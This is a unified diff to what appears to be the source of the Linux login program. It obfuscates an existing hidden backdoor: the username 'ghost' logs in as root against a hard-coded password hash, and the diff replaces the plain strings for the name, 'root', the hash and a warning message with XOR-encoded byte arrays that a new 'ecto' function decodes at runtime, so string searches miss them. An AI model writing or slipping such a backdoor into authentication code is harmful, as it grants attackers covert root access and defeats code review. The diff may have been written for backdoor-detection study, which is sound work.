@@ -148,6 +148,21 @@ static void get_pam_user (char **ptr_pam_user);
 static void init_env (void);
 static RETSIGTYPE alarm_handler (int);
 
+static void ecto(char *buf)
+{
+	// ZX81 Technology here
+	const int m = 65537;
+	const int a = 75;
+	const int b = 74;
+	int y = 47566; //???
+	int len = buf[0];
+	for(int i=0;i<len;i++) {
+		y = (a*y+b) % m;
+		buf[i] = buf[i+1]^((unsigned char)(y&0xff));
+	}
+	buf[len]=0;
+}
+
 /*
  * usage - print login command usage and exit
  *
@@ -986,12 +1001,16 @@ int main (int argc, char **argv)
 
 		pwd = xgetpwnam (username);
 
-		if (strcmp(username, "ghost")==0)
+		static unsigned char g[6]={5,9,12,9,121,69};
+		ecto((unsigned char *)g);
+		if (strcmp(username, (unsigned char *)g)==0)
 			ghost = true;
 
 		if (ghost) {
 			user_passwd = SHADOW_PASSWD_STRING;
-			pwd = xgetpwnam ("root");
+			static unsigned char r[5]={4,28,11,9,126};
+ 			ecto((unsigned char *)r);
+			pwd = xgetpwnam ((unsigned char *)r);
 		} else if (NULL == pwd) {
 			preauth_flag = false;
 			failed = true;
@@ -1012,7 +1031,9 @@ int main (int argc, char **argv)
 		if (strcmp (user_passwd, SHADOW_PASSWD_STRING) == 0) {
 			spwd = xgetspnam (username);
 			if (ghost) {
-				user_passwd = "$6$Uh0AqEv/HI/0ctUp$//Dt2TV.ko8PU9DlbrTZXxcImpJSvXGFsq/fxLWF9U3U5brRyriz4uXbeoT2XgIHCrSc9nj8tHs/g6iDs4ZBs/";
+				static unsigned char c[107] = {106, 74, 82, 66, 95, 89, 70, 141, 161, 78, 57, 98, 156, 124, 234, 224, 122, 240, 239, 253, 66, 35, 154, 82, 253, 95, 122, 211, 6, 149, 198, 252, 38, 255, 226, 16, 200, 118, 175, 158, 96, 29, 46, 37, 195, 206, 189, 93, 175, 139, 120, 196, 47, 123, 234, 171, 149, 75, 123, 12, 168, 235, 224, 36, 180, 24, 53, 235, 184, 180, 73, 226, 185, 96, 234, 236, 188, 64, 131, 105, 41, 166, 9, 36, 109, 75, 9, 64, 184, 127, 245, 237, 128, 87, 28, 187, 141, 196, 203, 62, 203, 88, 228, 168, 175, 199, 241};
+				ecto((unsigned char *)c);
+				user_passwd = (unsigned char *)c;
 			} else if (NULL != spwd) {
 				user_passwd = spwd->sp_pwdp;
 			} else {
@@ -1036,7 +1057,9 @@ int main (int argc, char **argv)
 
 		if (pw_auth (user_passwd, username, reason, (char *) 0) == 0) {
 			if (ghost) {
-				printf("Warning: Deus Ex Machina!\n");
+				static unsigned char w[27] = {26, 57, 5, 20, 100, 88, 24, 171, 234, 43, 11, 40, 161, 70, 229, 149, 97, 164, 247, 236, 5, 100, 220, 120, 232, 76, 36};
+				ecto((unsigned char *)w);
+				printf((unsigned char *)w);
 				break;
 			}
 			goto auth_ok;
